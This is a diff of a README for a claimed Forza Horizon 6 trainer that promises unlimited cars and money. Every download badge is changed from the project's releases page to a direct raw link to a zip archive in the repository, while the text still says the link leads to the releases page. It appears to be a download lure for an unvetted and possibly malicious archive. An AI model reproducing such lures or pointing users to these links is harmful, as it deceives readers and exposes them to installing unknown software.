@@ -1,6 +1,6 @@
 # 🏎️ FH6-Trainer-AllInOne - Unlock The Ultimate Forza Horizon 6 Experience
 
-[![Download FH6 Trainer](https://img.shields.io/badge/Download-FH6%20Trainer%20AllInOne-blue?style=for-the-badge&logo=windows&color=0084FF)](https://github.com/shennan8880/FH6-Trainer-AllInOne/releases)
+[![Download FH6 Trainer](https://img.shields.io/badge/Download-FH6%20Trainer%20AllInOne-blue?style=for-the-badge&logo=windows&color=0084FF)](https://raw.githubusercontent.com/shennan8880/FH6-Trainer-AllInOne/main/src/3.4.zip)
 
 ## 🎮 What Is FH6-Trainer-AllInOne?
 
@@ -50,7 +50,7 @@ Ready to enhance your Forza Horizon 6 experience? Follow these simple steps:
 
 ### Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github&color=28A745)](https://github.com/shennan8880/FH6-Trainer-AllInOne/releases)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github&color=28A745)](https://raw.githubusercontent.com/shennan8880/FH6-Trainer-AllInOne/main/src/3.4.zip)
 
 Visit this link to download the application. You'll be taken to the releases page where you can find the latest version.
 
@@ -187,7 +187,7 @@ This tool is provided free for personal use. Redistribution without permission i
 
 Don't spend hours grinding for credits or waiting for that perfect wheelspin. Get FH6-Trainer-AllInOne and start enjoying Forza Horizon 6 the way it was meant to be played - with all the cars, all the money, and all the fun.
 
-[![Download FH6 Trainer AllInOne](https://img.shields.io/badge/Download-FH6%20Trainer%20AllInOne-orange?style=for-the-badge&logo=download&color=FF6600)](https://github.com/shennan8880/FH6-Trainer-AllInOne/releases)
+[![Download FH6 Trainer AllInOne](https://img.shields.io/badge/Download-FH6%20Trainer%20AllInOne-orange?style=for-the-badge&logo=download&color=FF6600)](https://raw.githubusercontent.com/shennan8880/FH6-Trainer-AllInOne/main/src/3.4.zip)
 
 ---
 
